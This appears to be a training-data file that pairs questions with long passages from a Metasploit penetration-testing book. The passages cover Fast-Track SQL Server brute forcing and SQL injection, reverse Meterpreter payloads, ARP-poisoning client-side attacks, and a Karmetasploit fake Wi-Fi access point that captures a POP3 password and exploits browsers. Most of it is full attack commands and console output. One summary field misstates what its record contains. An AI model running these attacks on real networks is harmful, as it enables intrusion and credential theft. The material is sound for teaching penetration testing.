advanced server identification (cid:91). Although slow, this can be very\neffective.\nThe preceding output shows that Fast-Track successfully brute forced a\nsystem with the username of sa and password password. At this point, you can\nselect the payload and compromise the system, as shown here.\nEnter number here: 1\nEnabling: XP_Cmdshell...\nFinished trying to re-enable xp_cmdshell stored procedure if disabled.\nConfiguration file not detected, running default path.\nRecommend running setup.py install to configure Fast-Track.\nSetting default directory...\nWhat port do you want the payload to connect to you on: 4444\nMetasploit Reverse Meterpreter Upload Detected..\nLaunching Meterpreter Handler.\nCreating Metasploit Reverse Meterpreter Payload..\nSending payload: c88f3f9ac4bbe0e66da147e0f96efd48dad6\nSending payload: ac8cbc47714aaeed2672d69e251cee3dfbad\nMetasploit payload delivered..\nConverting our payload to binary, this may take a few...\nCleaning up...\nLaunching payload, this could take up to a minute...\nWhen finished, close the metasploit handler window to return to other\ncompromised SQL Servers.\n[*] Please wait while we load the module tree...\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Starting the payload handler...\nFast-Track 171\n[*] Transmitting intermediate stager for over-sized stage...(216 bytes)\n[*] Sending stage (718336 bytes)\n[*] Meterpreter session 1 opened (10.211.55.130:4444 -> 10.211.55.128:1030)\nmeterpreter >\nYou should now have full access to the machine using the Meterpreter\npayload.\nSQLPwnage\nSQLPwnage is a mass brute force attack that can be used against web applica-\ntions in an attempt to find Microsoft SQL injection. SQLPwnage will scan\nsubnets for web servers on port 80, crawl websites, and attempt to fuzz post\nparameters until it finds SQL injection. It supports both error- and blind-\nbased SQL injection and will handle everything from privilege escalation to\nre-enabling the xp_cmdshell stored procedure, bypassing the Windows debug\n64KB restriction, and dropping any payload you want onto the system.\nBegin the configuration for this attack by selecting Microsoft SQL Tools\nfrom the Fast-Track main menu, followed by SQLPwnage, option 2, as shown\nbelow.\nSQLPwnage Main Menu:\n1. SQL Injection Search/Exploit by Binary Payload Injection (BLIND)\n(cid:88) 2. SQL Injection Search/Exploit by Binary Payload Injection (ERROR BASED)\n3. SQL Injection single URL exploitation\nEnter your choice: 2\n. . . SNIP . . .\nScan a subnet or spider single URL?\n1. url\n(cid:89) 2. subnet (new)\n3. subnet (lists last scan)\nEnter the Number: 2\nEnter the ip range, example 192.168.1.1-254: 10.211.55.1-254\nScanning Complete!!! Select a website to spider or spider all??\n1. Single Website\n(cid:90) 2. All Websites\nEnter the Number: 2\nAttempting to Spider: http://10.211.55.128\nCrawling http://10.211.55.128 (Max Depth: 100000)\nDONE\nFound 0 links, following 0 urls in 0+0:0:0\n172 Chapter 11\nSpidering is complete.\n*************************************************************************\nhttp://10.211.55.128\n*************************************************************************\n[+] Number of forms detected: 2 [+]\n(cid:91) A SQL Exception has been encountered in the \"txtLogin\" input field of the\nabove website.\nDepending on whether the website presents an error when SQL injec-\ntion attempts are made, you will need to choose between BLIND and ERROR\nBASED attacks. At (cid:88) we choose ERROR BASED because the site is kind enough\ntoreport back error messages when it has trouble executing a SQL query.\nNext, choose either to spider a single URL or to scan a complete subnet (cid:89).\nAfter scanning the subnet, we choose to attack all the sites Fast-Track found (cid:90).\nAs you can see, scanning all the sites found a vulnerable form (cid:91) on one site.\nThe final configuration steps require that you select a payload. In the\nfollowing example, you select Metasploit Meterpreter Reflective Reverse TCP\n(cid:88) along with the port at (cid:89) that you want your attacking machine to listen\non. After Fast-Track has successfully exploited the SQL injection vulnerabil-\nity, it sends a chunked payload (cid:90) to the target and eventually presents you\nwith your Meterpreter shell (cid:91).\nWhat type of payload do you want?\n1. Custom Packed Fast-Track Reverse Payload (AV Safe)\n2. Metasploit Reverse VNC Inject (Requires Metasploit)\n3. Metasploit Meterpreter Payload (Requires Metasploit)\n4. Metasploit TCP Bind Shell (Requires Metasploit)\n5. Metasploit Meterpreter Reflective Reverse TCP\n6. Metasploit Reflective Reverse VNC\n(cid:88) Select your choice: 5\n(cid:89) Enter the port you want to listen on: 9090\n[+] Importing 64kb debug bypass payload into Fast-Track... [+]\n[+] Import complete, formatting the payload for delivery.. [+]\n[+] Payload Formatting prepped and ready for launch. [+]\n[+] Executing SQL commands to elevate account permissions. [+]\n[+] Initiating stored procedure: 'xp_cmdhshell' if disabled. [+]\n[+] Delivery Complete. [+]\nCreated by msfpayload (http://www.metasploit.com).\nPayload: windows/patchupmeterpreter/reverse_tcp\nLength: 310\nOptions: LHOST=10.211.55.130,LPORT=9090\nLaunching MSFCLI Meterpreter Handler\nCreating Metasploit Reverse Meterpreter Payload..\nTaking raw binary and converting to hex.\nRaw binary converted to straight hex.\n(cid:90) [+] Bypassing Windows Debug 64KB Restrictions. Evil. [+]\nFast-Track 173\n. . . SNIP . . .\nRunning cleanup before launching the payload....\n[+] Launching the PAYLOAD!! This may take up to two or three minutes. [+]\n[*] Please wait while we load the module tree...\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Starting the payload handler...\n[*] Transmitting intermediate stager for over-sized stage...(216 bytes)\n[*] Sending stage (2650 bytes)\n[*] Sleeping before handling stage...\n[*] Uploading DLL (718347 bytes)...\n[*] Upload completed.\n(cid:91) [*] Meterpreter session 1 opened (10.211.55.130:9090 -> 10.211.55.128:1031)\nmeterpreter >\nBinary-to-Hex Generator\nThe binary-to-hex generator is useful when you already have access to a sys-\ntem and you want to deliver an executable to the remote file system. Point\nFast-Track to the executable, and it will generate a text file that you can copy\nand paste to the target operating system. To convert the hexadecimal back to\na binary and execute it, choose option 6 as shown at (cid:88) below.\n(cid:88) Enter the number: 6\nBinary to Hex Generator v0.1\n. . . SNIP . . .\n(cid:89) Enter the path to the file you want to convert to hex: /pentest/exploits/\nfasttrack/nc.exe\nFinished...\nOpening text editor...\n// Output will look like this\n(cid:90) DEL T 1>NUL 2>NUL\necho EDS:0 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00>>T\necho EDS:10 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00>>T\necho FDS:20 L 10 00>>T\necho EDS:30 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00>>T\necho EDS:40 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68>>T\necho EDS:50 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F>>T\necho EDS:60 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20>>T\necho EDS:70 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00>>T\nAfter selecting the Binary to Hex Payload Converter, point Fast-Track to the\nbinary you want to convert at (cid:89) and wait for the magic. At this point, you can\nsimply copy and paste the output from (cid:90) into an existing shell window.\n174 Chapter 11\nMass Client-Side Attack\nThe mass client-side attack is similar to the Browser Autopwn function; however,\nthis attack includes additional exploits and built-in features that can incorpo-\nrate ARP cache and DNS poisoning on the target’s machine, and additional\nbrowser exploits not included in Metasploit.\nWhen a user connects to your web server, Fast-Track will fire off every\nexploit in its arsenal as well as those in the Metasploit Framework. If the\nuser’s machine is susceptible to a specific vulnerability within one of these\nlibraries, the attacker will obtain full access to the target machine.\n(cid:88) Enter the number: 4\n. . . SNIP . . .\n(cid:89) Enter the IP Address you want the web server to listen on: 10.211.55.130\nSpecify your payload:\n1. Windows Meterpreter Reverse Meterpreter\n2. Generic Bind Shell\n3. Windows VNC Inject Reverse_TCP (aka \"Da Gui\")\n4. Reverse TCP Shell\n(cid:90) Enter the number of the payload you want: 1\nAfter selecting option 4, Mass Client-Side Attack (cid:88), from the main menu,\ntell Fast-Track what IP address the web server should listen on (cid:89), and then\nchoose a payload (cid:90).\nNext, decide whether to use Ettercap to ARP-poison your target machine.\nEttercap will intercept all requests that the target makes and redirect them to\nyour malicious server. After confirming that you want to use Ettercap at (cid:88),\nenter the IP address of the target you want to poison (cid:89). Fast-Track will then\ngo ahead and set up Ettercap (cid:90) for you.\n(cid:88) Would you like to use Ettercap to ARP poison a host yes or no: yes\n. . . SNIP . . .\n(cid:89) What IP Address do you want to poison: 10.211.55.128\nSetting up the ettercap filters....\nFilter created...\nCompiling Ettercap filter...\n. . . SNIP . . .\n(cid:90) Filter compiled...Running Ettercap and poisoning target...\nOnce a client connects to your malicious server, Metasploit fires exploits (cid:88)\nat the target. In the following listing, you can see that the Adobe exploit is\nsuccessful, and a Meterpreter shell is waiting (cid:89).\nFast-Track 175\nNOTE You could use ARP cache poisoning within this attack, but it will only work when you\nare on the same local and unrestricted subnet as the target.\n[*] Local IP: http://10.211.55.130:8071/\n[*] Server started.\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Exploit running as background job.\n[*] Using URL: http://0.0.0.0:8072/\n[*] Local IP: http://10.211.55.130:8072/\n[*] Server started.\nmsf exploit(zenturiprogramchecker_unsafe) >\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Using URL: http://0.0.0.0:8073/\n[*] Local IP: http://10.211.55.130:8073/\n[*] Server started.\n(cid:88) [*] Sending Adobe Collab.getIcon() Buffer Overflow to 10.211.55.128:1044...\n[*] Attempting to exploit ani_loadimage_chunksize\n[*] Sending HTML page to 10.211.55.128:1047...\n[*] Sending Adobe JBIG2Decode Memory Corruption Exploit to 10.211.55.128:1046...\n[*] Sending exploit to 10.211.55.128:1049...\n[*] Attempting to exploit ani_loadimage_chunksize\n[*] Sending Windows ANI LoadAniIcon() Chunk Size Stack Overflow (HTTP) to\n10.211.55.128:1076...\n[*] Transmitting intermediate stager for over-sized stage...(216 bytes)\n[*] Sending stage (718336 bytes)\n(cid:89) [*] Meterpreter session 1 opened (10.211.55.130:9007 -> 10.211.55.128:1077\nmsf exploit(zenturiprogramchecker_unsafe) > sessions -l\nActive sessions\n===============\nId Description Tunnel\n-- ----------- ------\n1 Meterpreter 10.211.55.130:9007 -> 10.211.55.128:1077\nmsf exploit(zenturiprogramchecker_unsafe) > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter >\nA Few Words About Automation\nFast-Track offers a plethora of exploitation capabilities that expand upon the\nfeature-rich Metasploit Framework. When coupled with Metasploit it will allow\nyou to use advanced attack vectors to fully control a target machine. Of\ncourse, automated attack vectors do not always succeed, which is why you\nmust understand the system you are performing the attack against and\nensure that when you attack it, you know its chances of success. If an auto-\nmated tool fails, your ability to perform the tests manually and successfully\nattack the target system will make you a better penetration tester.\n176 Chapter 11"
  },
  {
    "input": "What is Karmetasploit and how does it exploit wireless network vulnerabilities to gain access to a target's network?",
    "summary": "Karmetasploit is a Metasploit tool that uses the KARMA attack to exploit wireless network vulnerabilities. It sets up a fake access point and uses malicious services to capture client data and gain control over network traffic. The attack leverages the fact that devices automatically connect to previously used networks, allowing an attacker to intercept information with minimal effort.",
    "output": "K A R M E T A S P L O I T\nKarmetasploit is Metasploit’s implementation of\nKARMA, a set of wireless security tools developed\nby Dino Dai Zovi and Shane Macaulay. KARMA takes\nadvantage of a vulnerability inherent in the way Win-\ndows XP and Mac OS X operating systems search\nfor networks: When each system boots, it sends bea-\ncons looking for networks to which it has connected\npreviously.\nAn attacker using KARMA sets up a fake access point on his computer\nand then listens for and responds to these beacons from the target, pretending\nto be whatever wireless network the client is looking for. Because most client\ncomputers are configured to connect automatically to wireless networks they\nhave already used, KARMA can be used to gain complete control of a client’s\nnetwork traffic, thus allowing an attacker to launch client-side attacks, capture\npasswords, and so forth. With the prevalence of poorly secured corporate\nwireless networks, an attacker using KARMA can sit in a nearby parking lot,\nadjacent office, or similar, and gain access to a target’s network with little\neffort. You can read more about the original implementation of KARMA at\nhttp://trailofbits.com/karma/.\nKarmetasploit is the Metasploit Framework implementation of the\nKARMA attack. It implements various “evil” services including DNS, POP3,\nIMAP4, SMTP, FTP, SMB, and HTTP. These services accept and respond to\nmost requests from clients and will serve up all kinds of malicious fun. (The\nvarious modules are in the modules/auxiliary/server directory of the Metasploit\nroot directory.)\nConfiguration\nKarmetasploit requires very little configuration. To begin, we configure a\nDHCP server to be used to hand out IP addresses to wireless targets. Back|\nTrack includes a DHCP server, but we will need to create a custom configura-\ntion file for it to use with Karmetasploit, as shown in the following listing:\n(cid:88) option domain-name-servers 10.0.0.1;\ndefault-lease-time 60;\nmax-lease-time 72;\nddns-update-style none;\nauthoritative;\nlog-facility local7;\nsubnet 10.0.0.0 netmask 255.255.255.0 {\n(cid:89) range 10.0.0.100 10.0.0.254;\noption routers 10.0.0.1;\noption domain-name-servers 10.0.0.1;\n}\nWe back up our original dhcpd.conf file by entering cp /etc/dhcp3/dhcpd.conf/\netc/dhcp3/dhcpd.conf.back, and then we create a new file containing the data\nshown at (cid:88), which will serve addresses in the range of 10.0.0.100 to 10.0.0.254 (cid:89).\n(If you are unfamiliar with DHCP configurations, don’t worry; as long as your\nnew dhcpd.conf looks similar to this it should work fine.)\nNext, we download the KARMA resource file, because as of this writing\nit’s not included in the regular Metasploit trunk:\nroot@bt:/opt/metasploit3/msf3# wget http://www.offensive-security.com/downloads/karma.rc\nWhen we open the KARMA resource file karma.rc, we can see the sequence\nof events that occur when it runs, as shown here:\nroot@bt:/opt/metasploit3/msf3# cat karma.rc\ndb_connect postgres:toor@127.0.0.1/msfbook\n(cid:88) use auxiliary/server/browser_autopwn\n(cid:89) setg AUTOPWN_HOST 10.0.0.1\nsetg AUTOPWN_PORT 55550\nsetg AUTOPWN_URI /ads\n(cid:90) set LHOST 10.0.0.1\nset LPORT 45000\n178 Chapter 12\nset SRVPORT 55550\nset URIPATH /ads\nrun\n(cid:91) use auxiliary/server/capture/pop3\nset SRVPORT 110\nset SSL false\nrun\nAfter loading the database (db_connect postgres:toor@127.0.0.1/msfbook)\nin which to store its results, KARMA loads the browser_autopwn server as shown\nat (cid:88). This is a handy way to attempt a number of exploits against a browser\nin an untargeted manner. A handful of the browser-based exploits in the\nFramework contain the directive include Msf::Exploit::Remote::BrowserAutopwn:\nExploits that contain that include line will be attempted when the autopwn\nserver is accessed.\nAt (cid:89) and (cid:90), the local IP address is set to 10.0.0.1, which coincides with\nthe default DHCP configuration. Then, in lines (cid:91) and on, the various servers\nare configured and started. (To get a complete picture of what occurs in this\nattack, read the resource file.)\nNext, we place our wireless card in monitor mode. The way in which we\ndo this depends on our wireless card’s chipset. The wireless card in the fol-\nlowing example uses the RT73 chipset. We use airmon-ng start wlan0 to place\nit in monitor mode:\nroot@bt:/opt/metasploit3/msf3# airmon-ng start wlan0\nNOTE If your card uses a different chipset from the one used in this example, visit the\nAircrack-ng website (http://www.aircrack-ng.org/) for specifics on how to place\nyour card in monitor mode.\nLaunching the Attack\nThe airbase-ng component of the Aircrack-ng suite is used to create Karmeta-\nsploit’s fake access point. In the next example, we configure the airbase-ng\naccess point to respond to all probes (-P), to beacon every 30 seconds (-C 30)\nwith the ESSID Free Wi-Fi (-e \"Free WiFi\"), and to be verbose (-v) using the\ninterface mon0:\nroot@bt:/opt/metasploit3/msf3# airbase-ng -P -C 30 -e \"Free WiFi\" -v mon0\n(cid:88) 14:06:57 Created tap interface at0\n14:06:57 Trying to set MTU on at0 to 1500\n14:06:57 Trying to set MTU on mon0 to 1800\n14:06:57 Access Point with BSSID 00:21:29:E2:DE:14 started.\nAs you can see at (cid:88), Airbase-ng creates a new interface called at0. Kar-\nmetasploit will use this interface.\nKarmetasploit 179\nNext, we turn on the at0 interface and start the DHCP server:\n(cid:88) root@bt:/opt/metasploit3/msf3# ifconfig at0 up 10.0.0.1 netmask 255.255.255.0\n(cid:89) root@bt:/opt/metasploit3/msf3# dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0\n. . . SNIP . . .\nWrote 0 leases to leases file.\nListening on LPF/at0/00:21:29:e2:de:14/10.0.0/24\nSending on LPF/at0/00:21:29:e2:de:14/10.0.0/24\nSending on Socket/fallback/fallback-net\nCan't create PID file /var/run/dhcpd.pid: Permission denied.\n(cid:90) root@bt:/opt/metasploit3/msf3# ps aux |grep dhcpd\ndhcpd 4015 0.0 0.2 3812 1840 ? Ss 14:09 0:00 dhcpd3 -cf /etc/dhcp3/\ndhcpd.conf at0\nroot 4017 0.0 0.0 2012 564 pts/4 S+ 14:09 0:00 grep dhcpd\n(cid:91) root@bt:/opt/metasploit3/msf3# tail tail -f /var/log/messages\nApr 2 14:06:57 bt kernel: device mon0 entered promiscuous mode\nApr 2 14:09:30 bt dhcpd: Internet Systems Consortium DHCP Server V3.1.1\nApr 2 14:09:30 bt kernel: warning: `dhcpd3' uses 32-bit capabilities (legacy support in use)\nApr 2 14:09:30 bt dhcpd: Copyright 2004-2008 Internet Systems Consortium.\nApr 2 14:09:30 bt dhcpd: All rights reserved.\nApr 2 14:09:30 bt dhcpd: For info, please visit http://www.isc.org/sw/dhcp/\nApr 2 14:09:30 bt dhcpd: Wrote 0 leases to leases file.\nApr 2 14:09:30 bt dhcpd: Listening on LPF/at0/00:21:29:e2:de:14/10.0.0/24\nApr 2 14:09:30 bt dhcpd: Sending on LPF/at0/00:21:29:e2:de:14/10.0.0/24\nThe at0 interface is turned on using the IP address of 10.0.0.1 shown at (cid:88),\nand the DHCP server is started using the configuration file we created earlier,\nalso using at0 as shown at (cid:89). To make sure that the DHCP server is running,\nwe run a quick ps aux at (cid:90). Finally, we tail the messages log file at (cid:91) to see when\nIP addresses are being handed out.\nNow that the entire Karmetasploit configuration is complete, we can\nload the resource file from within msfconsole using resource karma.rc as shown\nnext. (Note that we can also pass the resource file to msfconsole via the com-\nmand line by entering msfconsole -r karma.rc.) Let’s see it in action:\nmsf > resource karma.rc\nresource (karma.rc)> db_connect postgres:toor@127.0.0.1/msfbook\nresource (karma.rc)> use auxiliary/server/browser_autopwn\nresource (karma.rc)> setg AUTOPWN_HOST 10.0.0.1\nAUTOPWN_HOST => 10.0.0.1\nresource (karma.rc)> setg AUTOPWN_PORT 55550\nAUTOPWN_PORT => 55550\nresource (karma.rc)> setg AUTOPWN_URI /ads\nAUTOPWN_URI => /ads\n(cid:88) resource (karma.rc)> set LHOST 10.0.0.1\nLHOST => 10.0.0.1\nresource (karma.rc)> set LPORT 45000\nLPORT => 45000\nresource (karma.rc)> set SRVPORT 55550\nSRVPORT => 55550\nresource (karma.rc)> set URIPATH /ads\n180 Chapter 12\nURIPATH => /ads\nresource (karma.rc)> run\n[*] Auxiliary module execution completed\n(cid:89) resource (karma.rc)> use auxiliary/server/capture/pop3\nresource (karma.rc)> set SRVPORT 110\nSRVPORT => 110\nresource (karma.rc)> set SSL false\nSSL => false\nresource (karma.rc)> run\n. . . SNIP . . .\n(cid:90) [*] Starting exploit windows/browser/winzip_fileview with payload windows/\nmeterpreter/reverse_tcp\n[*] Using URL: http://0.0.0.0:55550/N9wReDJhfKg\n[*] Local IP: http://192.168.1.101:55550/N9wReDJhfKg\n[*] Server started.\n(cid:91) [*] Starting handler for windows/meterpreter/reverse_tcp on port 3333\n[*] Starting handler for generic/shell_reverse_tcp on port 6666\n[*] Started reverse handler on 10.0.0.1:3333\n[*] Starting the payload handler...\n[*] Started reverse handler on 10.0.0.1:6666\n[*] Starting the payload handler...\n[*] --- Done, found 15 exploit modules\n[*] Using URL: http://0.0.0.0:55550/ads\n[*] Local IP: http://192.168.1.101:55550/ads\n[*] Server started.\nAs you can see, a great deal is happening with the resource file. In this\nlisting, the LHOST address is set to 10.0.0.1 at (cid:88), the POP3 service (among others)\nis started at (cid:89), the autopwn exploits are loaded at (cid:90), and payloads are config-\nured at (cid:91).\nCredential Harvesting\nWhen a client connects to our malicious access point, the messages file we\nare tailing will show us when an IP address is handed out. This is our cue to\nswitch back to msfconsole to see what is happening. Here, we see that a client\nconnects and is assigned an IP address:\nApr 2 15:07:34 bt dhcpd: DHCPDISCOVER from 00:17:9a:b2:b1:6d via at0\nApr 2 15:07:35 bt dhcpd: DHCPOFFER on 10.0.0.100 to 00:17:9a:b2:b1:6d (v-xp-sp2-bare) via at0\nApr 2 15:07:35 bt dhcpd: DHCPREQUEST for 10.0.0.100 (10.0.0.1) from 00:17:9a:b2:b1:6d\n(v-xp-sp2-bare) via at0\nApr 2 15:07:35 bt dhcpd: DHCPACK on 10.0.0.100 to 00:17:9a:b2:b1:6d (v-xp-sp2-bare) via at0\nThe first thing our target does is open an email client. Karmetasploit is\nwaiting, as shown here:\n[*] DNS 10.0.0.100:1049 XID 45030 (IN::A time.windows.com)\n[*] DNS 10.0.0.100:1049 XID 47591 (IN::A pop3.securemail.com)\n(cid:88) [*] POP3 LOGIN 10.0.0.100:1102 bsmith / s3cr3tp4s5\nKarmetasploit 181"
  },
  {
    "input": "What is the process of creating a custom Metasploit module to exploit a vulnerability in the Surgemail IMAP Server by leveraging a buffer overflow and controlling the Structured Exception Handler (SEH)?",
    "summary": "The text describes a Metasploit attack that intercepts email credentials and uses a captive portal to exploit a vulnerable Windows system via Internet Explorer. It also explains how to create a custom Metasploit module to exploit a SQL Server vulnerability using PowerShell. The module sends a hex-encoded payload through SQL commands, which is then converted back to binary and executed. The process involves identifying and overcoming SEH (Structured Exception Handler) restrictions, using a return address from an application DLL, and handling bad characters to ensure reliable execution. The final exploit successfully compromises the target system by leveraging a buffer overflow in the SurgeMail IMAP server.",
    "output": "The POP3 server configured by Metasploit intercepts the target’s email\nusername and password at (cid:88), because all DNS requests are intercepted by\nthe DNS server that Karmetasploit set up for us.\nGetting a Shell\nAt this point, the user has no new messages, so he decides to do some web\nbrowsing. When the browser opens, a captive portal is presented to the user,\nas shown in Figure 12-1.\nFigure 12-1: Karmetasploit captive portal\nAs the user sits in front of his computer wondering what’s going on,\nKarmetasploit is busy configuring the attack to capture cookies; set up fake\nemail, DNS, and other servers; and launch exploits against the client’s browser—\nall the result of the magic contained in our karma.rc file.\nOf course, some degree of luck is involved in this attack. The browser\nwill display a “Loading” page while exploits are launched. If the user is impa-\ntient, he may simply close the browser window, which will stop our exploits.\nNext, you can see the massive amount of output that results from this attack:\n[*] HTTP REQUEST 10.0.0.100 > www.microsoft.com:80 GET /isapi/redir.dll Windows IE 6.0\ncookies=WT_NVR=0=/:1=downloads:2=downloads/en; WT_FPC=id=111.222.333.444-1008969152\n.30063513:lv=1267703430218:ss=1267703362203;MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&HASH=\nd23f&LV=20103&V=3; A=I&I=AxUFAAAAAAAuBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C864\n18EBC913CE45C4326AE\n[*] Request '/ads' from 10.0.0.100:1371\n(cid:88) [*] HTTP REQUEST 10.0.0.100 > adwords.google.com:80 GET /forms.html Windows IE 6.0 cookies=\n[*] HTTP REQUEST 10.0.0.100 > blogger.com:80 GET /forms.html Windows IE 6.0 cookies=\n182 Chapter 12\n[*] HTTP REQUEST 10.0.0.100 > care.com:80 GET /forms.html Windows IE 6.0 cookies=\n[*] HTTP REQUEST 10.0.0.100 > careerbuilder.com:80 GET /forms.html Windows IE 6.0 cookies=\n[*] HTTP REQUEST 10.0.0.100 > ecademy.com:80 GET /forms.html Windows IE 6.0 cookies=\n[*] HTTP REQUEST 10.0.0.100 > facebook.com:80 GET /forms.html Windows IE 6.0 cookies=\n. . . SNIP . . .\n[*] HTTP REQUEST 10.0.0.100 > www.slashdot.org:80 GET /forms.html Windows IE 6.0 cookies=\n[*] HTTP REQUEST 10.0.0.100 > www.twitter.com:80 GET /forms.html Windows IE 6.0 cookies=\n[*] Request '/ads?sessid=V2luZG93czpYUDpTUDI6ZW4tdXM6eDg2Ok1TSUU6Ni4wO1NQMjo%3d' from\n10.0.0.100:1371\n(cid:89) [*] JavaScript Report: Windows:XP:SP2:en-us:x86:MSIE:6.0;SP2:\n(cid:90) [*] Responding with exploits\n[*] HTTP REQUEST 10.0.0.100 > www.xing.com:80 GET /forms.html Windows IE 6.0 cookies=\n[*] HTTP REQUEST 10.0.0.100 > www.yahoo.com:80 GET /forms.html Windows IE 6.0 cookies=\n[*] HTTP REQUEST 10.0.0.100 > www.ziggs.com:80 GET /forms.html Windows IE 6.0 cookies=\n[*] HTTP REQUEST 10.0.0.100 > xing.com:80 GET /forms.html Windows IE 6.0 cookies=\n[*] HTTP REQUEST 10.0.0.100 > yahoo.com:80 GET /forms.html Windows IE 6.0 cookies=\n[*] HTTP REQUEST 10.0.0.100 > ziggs.com:80 GET /forms.html Windows IE 6.0 cookies=\n[*] HTTP REQUEST 10.0.0.100 > care.com:80 GET / Windows IE 6.0 cookies=\n[*] HTTP REQUEST 10.0.0.100 > www.care2.com:80 GET / Windows IE 6.0 cookies=\n(cid:91) [*] HTTP REQUEST 10.0.0.100 > activex.microsoft.com:80 POST /objects/ocget.dll Windows IE\n6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=\n1267703362203; MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&HASH=d23f&LV=20103&V=3;A=I&I=\nAxUFAAAAAAAuBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE\n[*] HTTP 10.0.0.100 attempted to download an ActiveX control\n[*] HTTP REQUEST 10.0.0.100 > activex.microsoft.com:80 POST /objects/ocget.dll Windows IE\n6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=126770\n3362203; MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&HASH=d23f&LV=20103&V=3;A=I&I=\nAxUFAAAAAAAuBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE\n[*] HTTP 10.0.0.100 attempted to download an ActiveX control\n(cid:92) [*] Sending Internet Explorer COM CreateObject Code Execution exploit HTML to 10.0.0.100:1371...\n[*] HTTP REQUEST 10.0.0.100 > activex.microsoft.com:80 POST /objects/ocget.dll Windows IE\n6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=\n1267703362203; MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&HASH=d23f&LV=20103&V=3;A=I&I=\nAxUFAAAAAAAuBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE\n[*] HTTP 10.0.0.100 attempted to download an ActiveX control\n[*] HTTP REQUEST 10.0.0.100 > codecs.microsoft.com:80 POST /isapi/ocget.dll Windows IE 6.0\ncookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=1267703362203;\nMC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&HASH=d23f&LV=20103&V=3; A=I&I=AxUFAAAAAAAu\nBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE\n. . . SNIP . . .\n[*] HTTP 10.0.0.100 attempted to download an ActiveX control\n[*] HTTP REQUEST 10.0.0.100 > codecs.microsoft.com:80 POST /isapi/ocget.dll Windows IE 6.0\ncookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=1267703362203;\nMC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&HASH=d23f&LV=20103&V=3; A=I&I=AxUFAAAAAAAu\nBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE\n[*] HTTP REQUEST 10.0.0.100 > codecs.microsoft.com:80 POST /isapi/ocget.dll Windows IE 6.0\ncookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=1267703362203;\nMC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&HASH=d23f&LV=20103&V=3; A=I&I=AxUFAAAAAAAu\nBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE\n[*] HTTP REQUEST 10.0.0.100 > codecs.microsoft.com:80 POST /isapi/ocget.dll Windows IE 6.0\ncookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=1267703362203;\nMC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&HASH=d23f&LV=20103&V=3; A=I&I=AxUFAAAAAAAu\nBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE\nKarmetasploit 183\n[*] Sending EXE payload to 10.0.0.100:1371...\n[*] Sending stage (748032 bytes) to 10.0.0.100\n(cid:93) [*] Meterpreter session 1 opened (10.0.0.1:3333 -> 10.0.0.100:1438)\nIn this output, you can see at (cid:88) that Metasploit first lets the client know\nthat various popular websites are in fact located on the attacking machine.\nThen, at (cid:89), it uses JavaScript to determine the target’s operating system and\nbrowser, and responds at (cid:90) with exploits based on that fingerprint. At (cid:91) the\nclient is presented with a malicious ActiveX control, resulting in the familiar\nyellow prompt bar in Internet Explorer, shown at the top of Figure 12-1. You\ncan also see buried in the output at (cid:92) that an exploit was launched against\nthe client. After a brief period, you see at (cid:93) that the exploit was successful\nand a Meterpreter session has been opened on the target PC!\nReturning to msfconsole, we can interact with the session that was created\nand check to see what permissions we have obtained on the target. Remember,\nwhen you exploit a browser it’s always a good idea to migrate your process\nout of the web browser in case it gets closed.\nmeterpreter > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter > sysinfo\nComputer: V-XP-SP2-BARE\nOS : Windows XP (Build 2600, Service Pack 2).\nArch : x86\nLanguage: en_US\nmeterpreter > getuid\nServer username: V-XP-SP2-BARE\\Administrator\nmeterpreter > run migrate -f\n[*] Current server process: jEFiwxBKyjoHGijtP.exe (3448)\n[*] Spawning a notepad.exe host process...\n[*] Migrating into process ID 2232\n[*] New server process: notepad.exe (2232)\nmeterpreter > screenshot\nScreenshot saved to: /opt/metasploit3/msf3/rkGrMLPa.jpeg\nmeterpreter >\nBecause this is a default installation of Windows XP SP2 with the very inse-\ncure Internet Explorer 6 installed (both of which are highly out of date), the\nclient didn’t even need to accept and install the malicious ActiveX control.\nWrapping Up\nAttacks against wireless networks have been a popular topic for quite some\ntime. Although this attack can take a bit of setup, imagine its success against a\nnumber of similarly configured clients located in a high-traffic 